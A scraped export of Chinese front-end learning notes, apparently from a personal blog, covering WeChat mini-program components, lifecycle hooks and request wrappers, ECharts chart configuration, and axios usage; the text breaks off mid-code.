静态资源放在网络上 [软件：图床 将本地图片 放到网络上] image组件默认宽度320px、高度240px 可以直接设置懒加载 属性： 属性 类型 默认值 必填 说明 最低版本 src string 否 图片资源地址 1.0.0 mode string scaleToFill 否 图片裁剪、缩放的模式 1.0.0 lazy-load boolean false 否 图片懒加载，在即将进入一定范围（上下三屏）时才开始加载 1.5.0 mode属性的值： scaleToFill ： 默认，不保持宽高比，使图片的宽高完全拉伸至填满 aspectFit ：常用，保持宽高比，使图片的长边能完全显示出来 aspectFill ：少用，保持宽高比，使图片的短边能完全显示出来 widthFix ：常用，保持宽高比，宽度不变，高度自动变化 heightFix ： 保持宽高比，高度不变，宽度自动变化 top、bottom、center、left、right、top left、top right、bottom left、bottom right ： 不缩放图片，只显示图片的…区域（相当于background-position） 5.4 swiper 轮播图 swiper(轮播图外层容器) &gt; swiper-item (轮播项) swiper存在默认宽(100%)高(150px) 如果里面要用到image也是有默认宽高的(320px * 240px) swiper不会被里面撑开 要计算swiper 和 image 的宽高 属性： autoplay 自动播放 interval 轮播时间 ms circular 循环轮播 indicator-dots 显示 指示器/分页器/索引器 indicator-color 指示器未选中颜色 indicator-active-color 指示器选中颜色 123456789&lt;!-- 先找出 原图的宽高 等比例 给swiper 定宽高原图 520 * 280px swiper 宽 / 高 = 原图 宽 / 高height: swiper 宽 * 原图 高 / 宽 = 100vw * 280px / 520px --&gt;&lt;swiper autoplay interval=&quot;2000&quot; circular indicator-dots&gt; &lt;swiper-item&gt; &lt;image mode=&quot;widthFix&quot; src=&quot;...&quot; /&gt;&lt;/swiper-item&gt; &lt;swiper-item&gt; &lt;image mode=&quot;widthFix&quot; src=&quot;...&quot; /&gt;&lt;/swiper-item&gt; &lt;swiper-item&gt; &lt;image mode=&quot;widthFix&quot; src=&quot;...&quot; /&gt;&lt;/swiper-item&gt;&lt;/swiper&gt; 12345678swiper&#123; width: 100%; height: calc(100vw * 280 / 520);&#125;image&#123; width: 100%;&#125; 5.5 navigator 超链接 导航组件 navigator 块级标签 属性： url：当前小程序内的跳转链接 targer：在哪个目标上发生跳转，默认当前小程序 self(自己 默认) / miniProgram(其他小程序) open-type：跳转方式 navigate：默认，保留当前页面，跳转应用内某页面，不能跳转tabbar页面 redirect：关闭当前页面，跳转应用内某页面，不能跳转tabbar页面 switchTab：跳转tabBar页面，并关闭其他所有页面 reLaunch：关闭所有页面，打开到应用内某页面 navigateBack：关闭当前页面，返回上一页面，可通过getCurrentPages()获取当前页面栈 exit：退出小程序，target=”miniProgram”时使用 5.6 rich-text 富文本 相当于v-html 1&lt;rich-text nodes=&quot;&#123;&#123;html&#125;&#125;&quot;&gt;&lt;/rich-text&gt; 1234567Page(&#123; data:&#123; //1. 字符串 &lt;div&gt;hello&lt;/div&gt; html:&quot;&quot; //2. 对象形式 &#125;&#125;) 5.7 button 5.7.1 外观属性 官网 size 尺寸：default(默认) / mini(小尺寸) type 颜色：default(灰色) / primary(绿色) / warn(红色) plain 背景透明 loading 文字前面 + 加载logo open-type 开发功能 ：… 5.7.2 开放功能 open-type 的值： contact 打开客服对话 需要在微信小程序的后台配置 只能真机调试 将小程序的appid 由测试号 改为自己的 appid 登录 微信小程序官网 添加 客服-微信 share 转发当前小程序到微信朋友 不能发到朋友圈 getPhoneNumber 获取当前用户手机号码信息 结合事件 if非企业小程序 就没有权限获取 绑定事件 bindgetpphonenumber 在回调函数中 通过参数来获取信息 / 事件源e 获取的信息加密了 需要用户自己搭建小程序后台服务器 在其解析 返回到小程序才能看到 getUserInfo 获取当前用户的个人信息 绑定事件 bindgetuserinfo 可以获取到 launchApp 在当前小程序 直接打开app 需要先在app 中 通过app 打开小程序 然后在小程序中 点击这个button 才能打开 app openSetting 打开小程序内置的 授权页面 只会出现用户曾经授权过的 feedback 打开小程序内置的 意见反馈页面 只能真机调试 5.8 icon 属性: type：图标类型 success, success_no_circle, info, warn, waiting, cancel, download, search, clear size：默认23 ，数值越大 图标越大 color：与css颜色同 5.9 radio radio-group &gt; radio 可以使用color属性 换颜色 选择单选框 触发的事件 bindchange 需求：选择 在页面中显示选择的内容 123456&lt;radio-group bindchange=&quot;handleChange&quot;&gt; &lt;radio value=&quot;male&quot;&gt;男&lt;/radio&gt; &lt;radio value=&quot;female&quot;&gt;女&lt;/radio&gt;&lt;/radio-group&gt;&lt;view&gt;您选择的是：&#123;&#123;gender&#125;&#125; &lt;/view&gt; 1234567891011Page(&#123; data:&#123; gender:&quot;&quot; &#125;, handleChange(e)&#123; let gender = e.detail.value; this.setData(&#123; gender &#125;) &#125;&#125;) 5.10 checkbox checkbok-group &gt; checkbox 可以使用color属性 换颜色 12345&lt;checkbox-group bindchange=&quot;handleChange&quot;&gt; &lt;checkbox value=&quot;&#123;&#123;item.value&#125;&#125;&quot; wx:for=&quot;&#123;&#123;list&#125;&#125;&quot; wx:key=&quot;id&quot;&gt;&#123;&#123;item.name&#125;&#125;&lt;/checkbox&gt;&lt;/checkbox-group&gt;&lt;view&gt;您选择的是：&#123;&#123;checkedlist&#125;&#125; &lt;/view&gt; 12345678910111213141516Page(&#123; data:&#123; list:[ &#123;id:&#x27;1&#x27;,name:&#x27;apple&#x27;,value:&#x27;apple&#x27;&#125;, &#123;id:&#x27;2&#x27;,name:&#x27;pear&#x27;,value:&#x27;pear&#x27;&#125;, &#123;id:&#x27;3&#x27;,name:&#x27;grape&#x27;,value:&#x27;grape&#x27;&#125;, ], checkedlist:[] &#125;, handleChange(e)&#123; const checkedlist = e.detail.value; this.setData(&#123; checkedlist &#125;) &#125;&#125;) 5.11 scroll-view 滚动视图区域 属性： 使用竖向滚动时，需要给scroll-view一个固定高度，通过 WXSS 设置 height。组件属性的长度单位默认为px，2.4.0起支持传入单位(rpx/px)。 less 使用 calc 希望css 原样使用 height:~’calc(100vh - 90rpx)’ scroll-x：允许横向滚动 scroll-y：允许纵向滚动 scroll-top：设置竖向滚动条位置 scroll-left：设置横向滚动条位置 点击 其他标签 使本来轮动到一定距离的页面 在顶部显示 1&lt;scroll-view scroll-top=&quot;&#123;&#123;scrollTop&#125;&#125;&quot; bindTap=&quot;handleChange&quot;&gt; 123456789data()&#123; scrollTop:0&#125;,handleChange()&#123; setData(&#123; //重新设置 右侧内容的scroll-view标签的距离顶部的距离 this.scrollTop:0 &#125;)&#125; 6.自定义组件 6.1 使用自定义组件 新增组件 定义组件 在组件的 json 文件中进行自定义组件声明 1234//在组件Tabs.json&#123; &quot;component&quot;:true&#125; 声明组件 在要使用组件的 json 文件中声明组件 123456//demo.json&#123; &quot;usingComponents&quot;: &#123; &quot;Tabs&quot;:&quot;../../components/Tabs/Tabs&quot; //组件名称:相对路径 &#125;&#125; 使用组件 在要使用的页面 使用 12&lt;!-- demo.wxml --&gt;&lt;Tabs&gt;&lt;/Tabs&gt; 6.2 注意事项 在页面 .js 文件中 事件回调函数 放在 与data 同层级 在组件 .js 文件中 事件回调函数 放在 与data 同层级 的 methods：{} 中 6.3 父向子组件传值 - 通过属性传递 在父组件wxml里 给子&lt;tabs&gt;组件 定义属性 在子组件js里 的 properties 接收值 属性名aaa : { type:数据类型,value:”” } 就可以直接在子组件wxml里使用了 12//com.wxml&lt;Tabs aaa=&quot;bbb&quot;&gt;&lt;/Tabs&gt; 12345678910//tabs.jsComponent(&#123; //组件的属性列表 properties: &#123; aaa: &#123; type: String, value: &quot;&quot; &#125; &#125; &#125;) 12//tabs.wxml &lt;view&gt;&#123;&#123;aaa&#125;&#125;&lt;/view&gt; 6.4 子向父组件传值 - 通过事件传递 子组件 点击事件 bindtap = ‘handleitemchange’ 触发 handleitemchange 事件 通过 this.triggerEvent( ‘父组件自定义事件名称 itemChange’ , 要传递的参数) 触发 父组件 的 binditemChange 事件 传递给父组件信息 父组件 自定义事件 binditemChange = ‘handleItemChange’ 被触发 自身处理事件 通过 handleItemChange(){} 函数 接受 参数 处理事件 代码中 如果 只是 父向 子组件 传 tabs ， 其他业务逻辑在子组件编写 也是会有效果的 但是 是因为 在子组件 接收到 tabs 后 处理 逻辑时 setData 后 把tabs 放在了子组件 的data里 父组件的值并没有改到 12345//父组件.wxml&lt;Tabs aaa=&quot;bbb&quot; tabs=&quot;&#123;&#123;tabs&#125;&#125;&quot; binditemChange=&quot;handleItemChange&quot;&gt;&lt;/Tabs&gt;//子组件.wxml&lt;view ... bindtap=&quot;itemchange&quot; &gt;&#123;&#123;item.value&#125;&#125;&lt;/view&gt; 123456789101112131415161718//子组件.jsComponent(&#123; properties: &#123; tabs: &#123; type: Array, value: [] &#125; &#125;, data: &#123;&#125;, methods: &#123; // 父子组件之间的通信 itemchange(e) &#123; //子组件 bindtap 触发的名字 const &#123; index &#125; = e.currentTarget.dataset; this.triggerEvent(&#x27;itemChange&#x27;, &#123; index &#125;); //父组件自定义事件名 bind + &#x27;...&#x27; &#125; &#125;&#125;) 1234567891011121314151617181920//父组件.jsPage(&#123; data: &#123; tabs: [ &#123; id: 1, value: &quot;首页&quot;, isActive: true &#125;, &#123; id: 2, value: &quot;新闻&quot;, isActive: false &#125;, &#123; id: 3, value: &quot;同城&quot;, isActive: false &#125;, &#123; id: 4, value: &quot;我的&quot;, isActive: false &#125; ] &#125;, handleItemChange(e) &#123; //父组件自定义事件值 // 接受传递过来的参数 const &#123; index &#125; = e.detail; let &#123; tabs &#125; = this.data; tabs.forEach((v, i) =&gt; i === index ? v.isActive = true : v.isActive = false) this.setData(&#123; //修改数据 tabs &#125;) &#125;,&#125;) 6.5 slot 插槽 其实就是一个占位符 直接写在组件标签里面，这些里面的东西就会替换slot 1234567891011//父组件&lt;Tabs&gt; &lt;view&gt; 111 &lt;/view&gt;&lt;/Tabs&gt;//子组件&lt;view class=&quot;tabs&quot;&gt; &lt;slot&gt;&lt;/slot&gt; &lt;/view&gt; 6.6 组件的其他属性 ​ Component 里面的属性 定义段 类型 是否必填 描述 properties Object Map 否 组件的对外属性，是属性名到属性设置的映射表 data Object 否 组件的内部数据，和 properties 一同用于组件的模板渲染 observers Object 否 as vue watch — 组件数据字段监听器，用于监听 properties 和 data 的变化，参见 数据监听器 methods Object 否 组件的方法，包括事件响应函数和任意的自定义方法，关于事件响应函数的使用，参见 组件间通信与事件 created Function 否 as vue created — 组件生命周期函数-在组件实例刚刚被创建时执行，注意此时不能调用 setData ) attached Function 否 as vue mounting — 组件生命周期函数-在组件实例进入页面节点树时执行) ready Function 否 as vue mounted — 组件生命周期函数-在组件布局完成后执行) moved Function 否 as vue updated — 组件生命周期函数-在组件实例被移动到节点树另一个位置时执行) detached Function 否 as vue destoryed — 组件生命周期函数-在组件实例被从页面节点树移除时执行) 7. 生命周期 7.1 应用 app.js 生命周期 全局最外层是App({}) onLaunch() : 触发：应用第一次启动时; ​ 作用：应用第一次启动时，获取用户个人信息 onShow() : 触发：应用被用户看到时 ​ 作用：对应用的数据或页面效果 重置 onHide() : 触发：应用被隐藏时 ​ 作用：暂定 或 清除定时器 onError() : 触发：应用代码发生了报错的时候 ​ 作用：收集用户的错误信息，通过异步请求，将错误信息发到后台 onPageNotFound() : 触发：应用第一次启动时，找不到第一个入口页面 ​ 作用：通过js重新跳转到第二个首页 wx.navigateTo({url:’…’}) 不能跳转到tabbar页面 7.2 页面 demo.js 生命周期 data : 页面初始数据 onLoad : 页面加载完毕 发送异步请求初始化页面 onShow : 页面显示 onReady : 页面渲染完毕 onHide : 页面隐藏 切后台/跳链接 onUnload : 页面卸载 点击超链接 open-type 的值中 有包含关闭页面的才ok ：redirect、reLaunch、navigateBack onPullDownRefresh : 监听用户的下拉刷新操作 进行页面数据 效果 的刷新操作 onReachBottom : 监听页面上拉触底事件 需要让页面 上下滚动 onShareAppMessage : 点击右上角转发操作 onPageScroll : 页面滚动 onResize : 页面尺寸发生改变 小程序 横屏/竖屏切换 开启页面横批 在页面的json文件 ＋ { “pageOrientation”:”auto”} 然后在模拟器中就可以找到 切换模式 按钮 onTabItemTap : 当前页面 tabbar 页面 点击自己的 tab 键时 8.异步请求 8.1 使用 wx-request 官网位置 一般将异步请求写在页面周期函数的 onLoad 里 12345678910111213141516171819202122232425262728293031//index.jsPage(&#123; onLoad: function (options) &#123; wx.request(&#123; url: &#x27;https://service-dxtrccme-1302998929.gz.apigw.tencentcs.com/release/accordin&#x27;, success: (result) =&gt; &#123; console.log(result); &#125;, fail: (err) =&gt; &#123; console.log(err); &#125;, complete: () =&gt; &#123; &#125; &#125;); &#125;,&#125;)//to be functionPage(&#123; onLoad: function (options) &#123; getSiwperImage() &#125;, getSwiperImage()&#123; wx.request(&#123; url: &#x27;https://service-dxtrccme-1302998929.gz.apigw.tencentcs.com/release/accordin&#x27;, success: (result) =&gt; &#123; console.log(result); &#125;, fail: (err) =&gt; &#123; console.log(err); &#125;, complete: () =&gt; &#123; &#125; &#125;); &#125;&#125;) 8.2 优化异步请求es6 promise 方便嵌套 在 request 新建 index.js 到处 封装好的 Promise 的request 在要用到 异步请求 的页面 index.js 导入 request 用来发送请求的方法 1234567891011121314//在 request 新建 index.jsexport const request = (params) =&gt; &#123; return new Promise((resolve, reject) =&gt; &#123; wx.request(&#123; ...params, success: (res) =&gt; &#123; resolve(res); &#125;, fail: (err) =&gt; &#123; reject(err) &#125; &#125;) &#125;)&#125; 1234567891011//页面 index.js import &#123; request &#125; from &#x27;../../request/index.js&#x27;Page(&#123; onLoad: function (options) &#123; request(&#123; url: &#x27;https://service-dxtrccme-1302998929.gz.apigw.tencentcs.com/release/accordin&#x27; &#125;).then(res =&gt; &#123; this.setData(&#123; swiperlist: res.data.data &#125;) &#125;) &#125;,&#125;) 8.3 提取公共接口路径 12345678910111213141516171819//在 request 新建 index.jsexport const request = (params) =&gt; &#123; //定义公共接口路径 const baseUrl = &#x27;https://...&#x27; return new Promise((resolve, reject) =&gt; &#123; wx.request(&#123; ...params, url:baseUrl+params.url, success: (res) =&gt; &#123; resolve(res); &#125;, fail: (err) =&gt; &#123; reject(err) &#125; &#125;) &#125;)&#125; 8.4 es7 的 async 语法 es7 的 async 号称是解决 回调的 最终方案 异步 -&gt; 同步 因为小程序 明确指明支持 es6 -&gt; es5 所以写es7 语法会比较麻烦 如果设配比较旧 设备的时候 还是用es6 的promise 小程序开发工具中，勾选 es6 转 es5 语法 下载facebook的regenerator库中的 在小程序目录新建文件 lib/runtime/runtime.js 将代码拷贝进去 在需要使用anync的地方引入 import regeneratorRuntime from ‘…/…/lib/runtime/runtime’ 12345678910111213141516171819//第9 本地存储 中 有一个 function getCates() 将这个方法 使用async 和 await//也用上了baseurlimport regeneratorRuntime from ‘../../lib/runtime/runtime’async getCates()&#123; //1.使用es7 的 async await发送请求 const res = await request(&#123; url:&quot;/categories&quot; &#125;); this.Cates = res.data.message; // 把接口中的数据存入本地存储 wx.setStorageSync(&quot;cates&quot;,&#123;time:Data.now(),data:this.Cates&#125;); let leftMenuList = this.Cates.map(v =&gt; v.cat_name); let rightMenuList = this.Cates[0].children; this,setData(&#123; leftMenuList, rightMenuList &#125;)&#125; 8.5 将显示加载中的logo封装在请求中 加载中的官方文档 1234567891011121314151617181920212223242526272829303132333435363738//计同时发送请求的数据let ajaxtime = 0;export const request = (params) =&gt; &#123; ajaxtime++; //显示加载中 wx.showLoading(&#123; title:&quot;加载中&quot;, mask:true &#125;) //定义公共接口路径 const baseUrl = &#x27;https://...&#x27; return new Promise((resolve, reject) =&gt; &#123; wx.request(&#123; ...params, url:baseUrl+params.url, success: (res) =&gt; &#123; resolve(res); &#125;, fail: (err) =&gt; &#123; reject(err) &#125;, complete:() =&gt; &#123; ajaxtime--; //无论 所以同步请求都完成 成功还是失败 都执行 //关闭加载 if(ajaxtime === 0)&#123; wx.hideLoading(); &#125; &#125; &#125;) &#125;)&#125; 8.6 request 封装中增加 header 头部信息 12345678910111213141516171819202122232425262728293031323334353637383940414243444546//计同时发送请求的数据let ajaxtime = 0;export const request = (params) =&gt; &#123; //判断url 中的特点 if 有 /my/ 就得加 header 私有路径 let header = &#123;...params.header&#125;; if(params.url.includes(&quot;/my/&quot;))&#123; //拼接 header[&quot;Authorization&quot;] = wx.getStorageSync(&quot;token&quot;); &#125; ajaxtime++; //显示加载中 wx.showLoading(&#123; title:&quot;加载中&quot;, mask:true &#125;) //定义公共接口路径 const baseUrl = &#x27;https://...&#x27; return new Promise((resolve, reject) =&gt; &#123; wx.request(&#123; ...params, url:baseUrl+params.url, success: (res) =&gt; &#123; resolve(res); &#125;, fail: (err) =&gt; &#123; reject(err) &#125;, complete:() =&gt; &#123; ajaxtime--; //无论 所以同步请求都完成 成功还是失败 都执行 //关闭加载 if(ajaxtime === 0)&#123; wx.hideLoading(); &#125; &#125; &#125;) &#125;)&#125; 9.本地存储 web 与 小程序 中 本地存储的区别 代码 web：localStorage.setItem(“key”,”value”) ​ localStorage.getItem(“key”) ​ 小程序：wx.setStorageSync(“key”,”value”) ​ wx.getStorageSync(“key”) 存的时候 是否会做类型转换 ​ web：存数据时 会调用toString() 把数据转换成字符串 ​ 小程序：不会进行数据转换 即 传的是什么数据类型 取的就是什么类型的 小程序本地存储的过程 判断本地存储 有无旧数据 {time:Data.now() , data:[…]} if 无旧数据 直接发送请求 存入 本地存储 if 有 同时 旧数据没有过期 就直接使用本地存储的数据 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748Page(&#123; data()&#123; leftMenuList:[], rightMenuList:[] &#125;, Cates:[], onLaod():function(options)&#123; //1.获取本地存储中的数据 const Cates = wx.getStorageSync(&quot;cates&quot;); //2.判断 if(!Cates)&#123; //发送请求 this.getCates(); &#125;else&#123; //是否过期 10s if(Data.now() - Cates.time &gt; 1000 * 10)&#123; //过期 发送请求 this.getCates(); &#125;else&#123; //使用旧数据 this.Cates = Cates.data; let leftMenuList = this.Cates.map(v =&gt; v.cat_name); let rightMenuList = this.Cates[0].children; this,setData(&#123; leftMenuList, rightMenuList &#125;) &#125; &#125; &#125;, //获取数据 getCates()&#123; request(&#123;url:&quot;...&quot;&#125;).then(res =&gt; &#123; this.Cates = res.data.message; // 把接口中的数据存入本地存储 wx.setStorageSync(&quot;cates&quot;,&#123;time:Data.now(),data:this.Cates&#125;); let leftMenuList = this.Cates.map(v =&gt; v.cat_name); let rightMenuList = this.Cates[0].children; this,setData(&#123; leftMenuList, rightMenuList &#125;) &#125;) &#125;&#125;) 10 效果 10.1 previewImage将图片放大预览 wx.previewImage({ current: ‘’, // 当前显示图片的http链接 urls: [] // 需要预览的图片http链接列表 }) 10.2 showToast显示弹框 wx.showToast(){ ​ title:””, ​ icon:””, ​ mask:true //防抖 } 10.3 getSetting获取权限状态 wx.getSetting({ ​ success:(res) =&gt; { ​ ​ } }) 10.4 chooseAddress获取收货地址 之前有过的 wx.chooseAddress({ ​ success:(res) =&gt; { ​ … ​ } }) 10.5 showModal 显示弹窗 wx.showModal({ title: ‘提示’, content: ‘这是一个模态弹窗’, success (res) { if (res.confirm) { console.log(‘用户点击确定’) } else if (res.cancel) { console.log(‘用户点击取消’) } } }) 10.6 支付 支付流程 ：创建订单 -&gt; 准备支付 -&gt; 发起微信支付 -&gt; 查询订单 10.7 chooseImage 选择图片 wx.chooseImage({ ​ count:9, //同时选择的最大图片数量 ​ sizeType:[‘original’ , ‘compressed’], //图片格式 原图 压缩 ​ sourceType:[‘album’ , ‘camera’], //图片来源 相册 照相机 ​ success:(result) =&gt; { ​ this.Data({ ​ chooseImages = […this.data.chooseImages,…result.tempFilePaths] //拼接 图片数组 ​ }) ​ } })","categories":[{"name":"learningNotes","slug":"learningNotes","permalink":"https://shylees.github.io/categories/learningNotes/"}],"tags":[{"name":"小程序","slug":"小程序","permalink":"https://shylees.github.io/tags/%E5%B0%8F%E7%A8%8B%E5%BA%8F/"}]},{"title":"EChart的使用","slug":"ECharts的使用","date":"2021-06-30T16:00:00.000Z","updated":"2021-08-16T16:00:00.000Z","comments":false,"path":"learningNotes/ECharts的使用","link":"learningNotes/ECharts的使用","permalink":"https://shylees.github.io/learningNotes/ECharts%E7%9A%84%E4%BD%BF%E7%94%A8","excerpt":"","text":"1. EChart的使用(2021/07/01 pink老师) 1.1 使用步骤 下载并导入echarts.js文件 (@4.9.0 才有地图) 有多种导入方式 使用直接下载文件然后导入就可以了下载地址 准备一个有宽高的DOM容器 初始化echarts实例 const mychart = echarts.init(document.querySelector(‘.box’)); 指定配置项和数据option let option = { … } 将配置项设置给echarts实例对象 mychart.setOption(option); 1.2 基础配置 option里面的配置 title: 设置图表标题 tooltip: 提示框组件 trigger: 触发方式 值为axis时鼠标在坐标轴上时触发 axisPointer： 坐标轴指示器 值默认为line 也可以设置成shadow legend：图例组件 textStyle: 图例文字的样式 color left、right、top、bottom: 图例位置 toolbox： 工具箱组件 可以保存图片什么的 color： 后面的值是数组形式 线条的颜色 直角坐标系的配置 grid: 网格 – 控制线型图 柱状图 图表的大小 left、right、top、bottom： 控制大小 containLabel: 显示刻度标签 xAxis： 设置x轴的配置 type： category 类目、value值 boundaryGap:线条与坐标轴是否有缝隙 data：x轴的相关显示信息 axisLabel: 刻度标签的相关样式 有文字颜色 大小 样式什么的 axisLine： 坐标轴那条线的样式 show：表是否显示 yAxis: y轴的配置 axisLine： 坐标轴那条线的样式 if要设置样式 lineStyle: 在里面配置样式 axisTick: 坐标轴的刻度 show : 是否显示 splitLine: y轴分割线的样式 lineStyle: series: 系列图表的配置 决定显示哪种类型的图表 stack: if值相同 会发生数据堆叠 name: 与上legend的数组相同 if有name可不用legend barWidth: 柱子的宽度 barCategoryGap: 柱子距离 label: 显示柱子内的文字 show : 是否显示 position : “inside” formatter : “&#123;c&#125;%” //c 数据值 b 数据名 a系列名 会自动解析为data里的数据 itemStyle: 每个柱子的样式 barBorderRadius：圆角边框 color： 一般来说只能有一个颜色，就算是数组形式 也只会展示最后一个颜色 如果想要展示多个的话 可以 先 123456 &gt;const mycolor = [&quot;pink&quot;, &quot;blue&quot;, &quot;yellow&quot;, &quot;white&quot;, &quot;black&quot;] &gt;//然后在里面 &gt;color:function(params)&#123; &gt;// params传进来的是柱子对象 return mycolor[params.dataIndex] &gt;&#125; 如果想要展示一个框 12&gt;color:&quot;none&quot;,&gt;borderColor:&quot;pink&quot;, 1.3 柱形图 更改对应数据 横坐标的数据：axis 的data 纵坐标的数据: series 的data 使图表跟屏幕大小做自适应 123window.addEventListener(&quot;resize&quot;,function()&#123; myChary.resize();&#125;) 实现两组柱子层叠 在series里的两个柱子对象里 使用yAxisIndex:0和yAxisIndex:1 在不同的柱子上 坐标轴数组反转 在yAxis里inverse:true 1.4 折线图（2021/7/6） 改线的颜色 option里直接加color:[“”] 将折线改圆滑 在series里要平滑显示的线条对象 加上smooth:true 单独改变线的样式 在series里 lineStyle:&#123;...&#125; 渐变色填充区域 在series里 123456789101112areaStyle:&#123; // 渐变色，只需要复制即可 color:new echarts.graphic.LinearGradient(0,0,0,1, [&#123; offset:0, color:&quot;rgba(1,132,213,0.4)&quot; //起使颜色 &#125;,&#123; offset:0.8, color:&quot;rgba(1,132,213,0.1)&quot; //结束颜色 &#125;],false), shadowColor:&quot;rgba(0,0,0,0.1)&quot;&#125;, 拐点 在series里 symbol:&quot;circle&quot; symbolSize:12 showSymbol:false 一开始不显示，鼠标经过才显示 itemStyle:&#123;color:&quot;&quot; , borderColor:&quot;&quot; , borderWidth: &quot;&quot;&#125;拐点的样式 1.5 饼形图 触发方式 tooltip:&#123; trigger: 'item', ...&#125; 鼠标悬停饼 鼠标悬停部分饼状 中间出现文字 12345678910111213series:[ &#123; ... , emphasis:&#123; label:&#123; show:true, fontSize：’30‘, ... &#125; &#125;, ... &#125; ] 修改图例 12345legend:&#123; bottom:&quot;5%&quot;, //图例位置 itemWidth/itemHeight:10, //图标大小 textStyle:&#123;&#125; //修改图例文字&#125; 修改在容器中的位置 series:[ &#123; center:[ &quot;50%&quot; , &quot;50%&quot; ] &#125; ] 修改饼形大小 series:[ &#123; radius:[ &quot;40%&quot; , &quot;50%&quot; ] &#125; ] 内圆半径，外圆半径 模式 series:[ &#123; roseType:&quot;radius/area&quot; &#125; ] //半径模式 / 面积模式 图形的文字 和 线 1234567891011series:[ &#123; label:&#123; fontSize:10 &#125;, labelLine:&#123; length:50 //链接图形的线 length2:10 //链接文字的线条 &#125; &#125; ] 1.6 EChart社区 1.7 地图 先引入地图js 改变鼠标悬停后的颜色 1234567geo:&#123; normal:&#123; areaColor:&quot;pink&quot;, borderColor:&quot;...&quot; borderWidth:1 &#125;&#125; 改变大小 geo:&#123; zoom: 1.2 &#125;","categories":[{"name":"learningNotes","slug":"learningNotes","permalink":"https://shylees.github.io/categories/learningNotes/"}],"tags":[{"name":"js组件","slug":"js组件","permalink":"https://shylees.github.io/tags/js%E7%BB%84%E4%BB%B6/"}]},{"title":"10 axios","slug":"vue/10 axios","date":"2021-05-01T16:00:00.000Z","updated":"2021-05-02T16:00:00.000Z","comments":false,"path":"learningNotes/vue/10 axios","link":"learningNotes/vue/10 axios","permalink":"https://shylees.github.io/learningNotes/vue/10%20axios","excerpt":"","text":"[toc] 1.axios功能特点 在浏览器中发送XMLHttpRequests请求 在node.js中发送http请求 支持Promise API 拦截请求和响应 转换请求和响应数据 2.axios请求方式 axios(config) 默认get请求 axios.request(config) axios.get(url[,config]) axios.delete(url[,config]) axios.head(url[,config]) axios.post(url[,data[,config]]) axios.put(url[,data[,config]]) axios.patch(url[,data[,config]]) 3.axios框架的基本使用 接口：http://123.207.32.32:8000/home/multidata axios默认是get方法 123456789101112131415161718192021222324//get请求axios(&#123; url:&quot;http://123.207.32.32:8000/home/multidata&quot;&#125;).then(res =&gt; &#123; console.log(res)&#125;)//带参数axios(&#123; url:&quot;http://123.207.32.32:8000/home/data?type=pop&amp;page=1&quot;&#125;).then(res =&gt; &#123; console.log(res)&#125;)//get请求的参数拼接axios(&#123; url:&quot;http://123.207.32.32:8000/home/data&quot;, params:&#123; type:&#x27;pop&#x27;, page:1 &#125;&#125;).then(res =&gt; &#123; console.log(res)&#125;) 2.axios发送并发请求 123456789101112131415161718192021222324252627axios.all([axios(&#123; url: &quot;http://123.207.32.32:8000/home/multidata&quot; &#125;), axios(&#123; url: &quot;http://123.207.32.32:8000/home/data&quot;, params: &#123; type: &#x27;pop&#x27;, page: 2 &#125; &#125;)]) .then(results =&gt; &#123; console.log(results); &#125;);// 使用axios.spread可将数组[res1,res2]展开axios.all([axios(&#123; url: &quot;http://123.207.32.32:8000/home/multidata&quot; &#125;), axios(&#123; url: &quot;http://123.207.32.32:8000/home/data&quot;, params: &#123; type: &#x27;pop&#x27;, page: 2 &#125; &#125;)]) .then(axios.spread((res1, res2) =&gt; &#123; console.log(res1); console.log(res2); &#125;)) 3.全局配置 因为BaseURL是固定的，可以抽取/利用axios的全局配置 1234567891011// 3.全局配置 //超时 msaxios.defaults.baseURL = &quot;http://123.207.32.32:8000&quot;axios.defaults.timeout = 5//get请求axios(&#123; url: &quot;/home/multidata&quot;&#125;).then(res =&gt; &#123; // console.log(res);&#125;) 3.2常见的配置选项 如果是put params 如果是post data 4.axios实例和模块封装 4.1如果有多个请求接口时 使用实例会比较好 1234567891011121314151617181920212223242526272829//main.js// 4.创建对应的实例const instance1 = axios.create(&#123; baseURL = &quot;htp://123.207.32.32:8000&quot;, timeout: 5000&#125;)instance1(&#123; url: &quot;/home/multidata&quot;&#125;).then(res =&gt; &#123; console.log(res);&#125;)instance1(&#123; url: &quot;/home/data&quot;, params: &#123; type: &#x27;pop&#x27;, page: 1 &#125;&#125;).then(res =&gt; &#123; console.log(res);&#125;)const instance2 = axios.create(&#123; baseURL = &quot;htp://123.207.33.11:8000&quot;, timeout: 5000&#125;) 4.2 模块封装 如果有个第三方的东西需要导入，不要每一个组件都导入这个第三方框架，这样每个页面对这个框架依赖性太强了，如果有一天这个第三方的东西不再维护了，所有页面都得换掉 所以尽量封装成一个文件，这样改的话就改一个文件的就可以了 4.2.1.每个页面都导入的情况 12345678910111213141516171819//vue&lt;h2&gt;&#123;&#123; categories &#125;&#125;&lt;/h2&gt;import axios from &#x27;axios&#x27;export default &#123; name:&quot;HelloWorld&quot;, data()&#123; return &#123; categories:&quot;&quot; &#125; &#125;, //生命周期函数 组件创建好后 发送请求 created()&#123; axios(&#123; url:&quot;http://123.207.32.32:8000/category&quot; &#125;).then(res =&gt; &#123; this.categories = res; &#125;) &#125;&#125; 4.2.2 封装 4.2.2.1 src建文件夹 network 建request.js 12345678910111213141516171819202122232425262728293031//request.jsimport axios from &quot;axios&quot;;export function request(config, success, failure) &#123; // 1.创建axios的实例 const instance = axios.create(&#123; baseURL: &quot;http://123.207.32.32:8000&quot;, timeout: 5000 &#125;) // 发送真正的网络请求 // 通过两个函数 吧把结果回调出去 instance(config).then(res =&gt; &#123; console.log(res); success(res) &#125;).catch(err =&gt; &#123; console.log(err); failure(err) &#125;)&#125;//main.js//5.封装reque模块import &#123; request &#125; from &#x27;./network/request&#x27;request(&#123; url: &#x27;/home/multidata&#x27;&#125;, res =&gt; &#123; console.log(res);&#125;, err =&gt; &#123; console.log(err);&#125;) 4.2.2.2 另一种封装方法： 12345678910111213141516171819202122232425262728//request.jsimport axios from &quot;axios&quot;;export function request(config) &#123; // 1.创建axios的实例 const instance = axios.create(&#123; baseURL: &quot;http://123.207.32.32:8000&quot;, timeout: 5000 &#125;) instance(config.baseConfig).then(res =&gt; &#123; config.success(res) &#125;).catch(err =&gt; &#123; config.failure(err) &#125;)&#125;//mian.jsrequest(&#123; baseConfig:&#123; &#125;, success:function(res)&#123; &#125;, failure:function(err)&#123; &#125;&#125;) 4.2.2.3 推荐使用promise 1234567891011121314151617181920212223242526//request.jsimport axios from &quot;axios&quot;;export function request(config, success, failure) &#123; // 1.创建axios的实例 const instance = axios.create(&#123; baseURL: 